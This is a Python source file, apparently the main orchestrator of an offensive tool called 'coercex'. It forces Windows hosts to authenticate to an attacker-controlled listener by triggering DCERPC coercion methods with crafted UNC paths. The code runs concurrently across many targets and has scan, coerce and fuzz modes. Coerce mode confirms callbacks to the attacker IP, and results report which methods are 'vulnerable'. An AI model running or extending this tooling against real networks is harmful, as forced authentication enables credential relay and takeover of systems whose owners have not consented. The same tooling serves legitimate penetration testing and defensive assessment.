"""Main scan/coerce/fuzz orchestrator.

Ties together the DCERPC connection pool, async listener, and method
registry into a high-performance concurrent pipeline.

Three modes:
  - scan:   No listener, classify RPC error codes to detect vulnerable methods.
  - coerce: Starts listener, triggers with real UNC paths, confirms callbacks.
  - fuzz:   Tries multiple path styles/transports per method.
"""

from __future__ import annotations

import asyncio
import logging
import sys
from dataclasses import dataclass
from enum import Enum, auto
from typing import TextIO

from coercex.connection import DCERPCPool, trigger_method
from coercex.listener import AsyncListener
from coercex.methods import get_all_methods, group_by_pipe
from coercex.methods.base import CoercionMethod, PipeBinding
from coercex.utils import (
    Credentials,
    ScanResult,
    ScanStats,
    Transport,
    TriggerResult,
    build_unc_path,
)

log = logging.getLogger("coercex.scanner")


class Mode(Enum):
    SCAN = auto()
    COERCE = auto()
    FUZZ = auto()


@dataclass
class ScanConfig:
    """Configuration for a scan run."""

    targets: list[str]
    mode: Mode = Mode.SCAN
    protocols: list[str] | None = None
    creds: Credentials | None = None
    listener_host: str = ""  # Attacker IP for coerce/fuzz
    http_port: int = 80
    smb_port: int = 445
    transport: Transport = Transport.SMB
    concurrency: int = 50
    timeout: int = 5
    callback_timeout: float = 3.0  # Time to wait for listener callback
    verbose: bool = False


def _format_result_line(result: ScanResult) -> str:
    """Format a single result for live output."""
    sym = {
        TriggerResult.VULNERABLE: "[+]",
        TriggerResult.ACCESSIBLE: "[~]",
        TriggerResult.ACCESS_DENIED: "[-]",
        TriggerResult.NOT_AVAILABLE: "[ ]",
        TriggerResult.CONNECT_ERROR: "[!]",
        TriggerResult.TIMEOUT: "[T]",
        TriggerResult.UNKNOWN_ERROR: "[?]",
    }
    prefix = sym.get(result.result, "[?]")
    cb = " (callback!)" if result.callback_received else ""
    return f"{prefix} {result.target} | {result.protocol}::{result.method} via {result.pipe}{cb}"


class Scanner:
    """Orchestrates the coercion scan pipeline.

    Usage:
        scanner = Scanner(config)
        stats = await scanner.run()
    """

    def __init__(self, config: ScanConfig, output: TextIO = sys.stderr):
        self.config = config
        self.output = output
        self.stats = ScanStats()
        self._pool: DCERPCPool | None = None
        self._listener: AsyncListener | None = None
        self._semaphore = asyncio.Semaphore(config.concurrency)

    async def run(self) -> ScanStats:
        """Execute the scan and return aggregate stats."""
        creds = self.config.creds or Credentials()
        self._pool = DCERPCPool(creds, timeout=self.config.timeout)

        methods = get_all_methods(self.config.protocols)
        if not methods:
            log.error("No methods matched protocol filter")
            return self.stats

        self.stats.total_targets = len(self.config.targets)

        self._print(
            f"coercex | mode={self.config.mode.name.lower()} "
            f"targets={len(self.config.targets)} methods={len(methods)} "
            f"concurrency={self.config.concurrency}"
        )

        # Start listener for coerce/fuzz modes
        if self.config.mode in (Mode.COERCE, Mode.FUZZ):
            if not self.config.listener_host:
                log.error("Listener host required for coerce/fuzz mode")
                return self.stats
            self._listener = AsyncListener(
                host="0.0.0.0",
                http_port=self.config.http_port,
                smb_port=self.config.smb_port,
                enable_http=self.config.transport == Transport.HTTP,
                enable_smb=self.config.transport == Transport.SMB,
            )
            await self._listener.start()
            self._print(
                f"Listener started (http={self.config.http_port}, smb={self.config.smb_port})"
            )

        try:
            if self.config.mode == Mode.FUZZ:
                await self._run_fuzz(methods)
            else:
                await self._run_scan_or_coerce(methods)
        finally:
            if self._pool:
                await self._pool.close_all()
            if self._listener:
                await self._listener.stop()

        self._print_summary()
        return self.stats

    async def _run_scan_or_coerce(self, methods: list[CoercionMethod]) -> None:
        """Dispatch all target x method x pipe combinations."""
        tasks: list[asyncio.Task] = []

        for target in self.config.targets:
            for method in methods:
                for binding in method.pipe_bindings:
                    task = asyncio.create_task(self._attempt(target, method, binding))
                    tasks.append(task)

        # Gather all tasks, allowing exceptions to be collected
        await asyncio.gather(*tasks, return_exceptions=True)

    async def _run_fuzz(self, methods: list[CoercionMethod]) -> None:
        """Fuzz mode: try all path styles per method."""
        tasks: list[asyncio.Task] = []

        for target in self.config.targets:
            for method in methods:
                for binding in method.pipe_bindings:
                    for transport_name, path_style in method.path_styles:
                        transport = (
                            Transport.HTTP
                            if transport_name == "http"
                            else Transport.SMB
                        )
                        task = asyncio.create_task(
                            self._attempt(
                                target,
                                method,
                                binding,
                                transport_override=transport,
                                path_style_override=path_style,
                            )
                        )
                        tasks.append(task)

        await asyncio.gather(*tasks, return_exceptions=True)

    async def _attempt(
        self,
        target: str,
        method: CoercionMethod,
        binding: PipeBinding,
        transport_override: Transport | None = None,
        path_style_override: str | None = None,
    ) -> None:
        """Single trigger attempt, bounded by semaphore."""
        async with self._semaphore:
            transport = transport_override or self.config.transport
            path_style = path_style_override or "share_file"

            # Build the UNC path
            if self.config.mode == Mode.SCAN:
                # Scan mode: dummy path that won't actually call back
                # but will trigger the RPC and produce error codes
                path = build_unc_path(
                    "127.0.0.1", "coercexscan", transport, path_style=path_style
                )
                result = await trigger_method(self._pool, target, method, binding, path)
            else:
                # Coerce/fuzz: real listener path with correlation token
                if self._listener:
                    token, future = self._listener.create_token()
                else:
                    # Shouldn't happen, but handle gracefully
                    token = "notokenfallback"
                    future = None

                port = (
                    self.config.http_port
                    if transport == Transport.HTTP
                    else self.config.smb_port
                )
                path = build_unc_path(
                    self.config.listener_host,
                    token,
                    transport,
                    port=port,
                    path_style=path_style,
                )

                result = await trigger_method(self._pool, target, method, binding, path)

                # Wait for callback if trigger indicated vulnerability
                if future and result.result in (
                    TriggerResult.VULNERABLE,
                    TriggerResult.ACCESSIBLE,
                ):
                    try:
                        callback = await asyncio.wait_for(
                            future, timeout=self.config.callback_timeout
                        )
                        result.callback_received = True
                        result.source_ip = callback.source_ip
                        result.result = TriggerResult.VULNERABLE
                    except asyncio.TimeoutError:
                        pass
                elif future:
                    # Clean up unused token
                    self._listener.cancel_token(token)

            self.stats.add(result)
            self._emit(result)

    def _emit(self, result: ScanResult) -> None:
        """Print a result line (only for interesting results unless verbose)."""
        if self.config.verbose or result.result in (
            TriggerResult.VULNERABLE,
            TriggerResult.ACCESSIBLE,
        ):
            self._print(_format_result_line(result))

    def _print(self, msg: str) -> None:
        """Write a line to output."""
        print(msg, file=self.output, flush=True)

    def _print_summary(self) -> None:
        """Print scan summary statistics."""
        s = self.stats
        self._print("")
        self._print("=" * 60)
        self._print(
            f"Scan complete: {s.total_targets} targets, {s.total_attempts} attempts"
        )
        self._print(f"  Vulnerable:    {s.vulnerable}")
        self._print(f"  Accessible:    {s.accessible}")
        self._print(f"  Access Denied: {s.access_denied}")
        self._print(f"  Not Available: {s.not_available}")
        self._print(f"  Connect Errors:{s.connect_errors}")
        self._print(f"  Timeouts:      {s.timeouts}")
        self._print("=" * 60)


def format_results_table(stats: ScanStats, show_all: bool = False) -> str:
    """Format scan results as a table for stdout.

    Args:
        stats: Scan statistics with results.
        show_all: If False, only show vulnerable/accessible results.

    Returns:
        Formatted table string.
    """
    lines: list[str] = []

    results = stats.results
    if not show_all:
        results = [
            r
            for r in results
            if r.result in (TriggerResult.VULNERABLE, TriggerResult.ACCESSIBLE)
        ]

    if not results:
        return "No vulnerable methods found."

    # Header
    header = f"{'Target':<20} {'Protocol':<10} {'Method':<45} {'Pipe':<20} {'Result':<15} {'Callback':<8}"
    lines.append(header)
    lines.append("-" * len(header))

    for r in results:
        cb = "YES" if r.callback_received else ""
        lines.append(
            f"{r.target:<20} {r.protocol:<10} {r.method:<45} {r.pipe:<20} {r.result.value:<15} {cb:<8}"
        )

    return "\n".join(lines)


def format_results_json(stats: ScanStats, show_all: bool = False) -> str:
    """Format scan results as JSON."""
    import json

    results = stats.results
    if not show_all:
        results = [
            r
            for r in results
            if r.result in (TriggerResult.VULNERABLE, TriggerResult.ACCESSIBLE)
        ]

    data = {
        "summary": {
            "total_targets": stats.total_targets,
            "total_attempts": stats.total_attempts,
            "vulnerable": stats.vulnerable,
            "accessible": stats.accessible,
            "access_denied": stats.access_denied,
            "not_available": stats.not_available,
            "connect_errors": stats.connect_errors,
            "timeouts": stats.timeouts,
        },
        "results": [
            {
                "target": r.target,
                "protocol": r.protocol,
                "method": r.method,
                "pipe": r.pipe,
                "uuid": r.uuid,
                "result": r.result.value,
                "callback_received": r.callback_received,
                "source_ip": r.source_ip,
                "error": r.error,
            }
            for r in results
        ],
    }
    return json.dumps(data, indent=2)
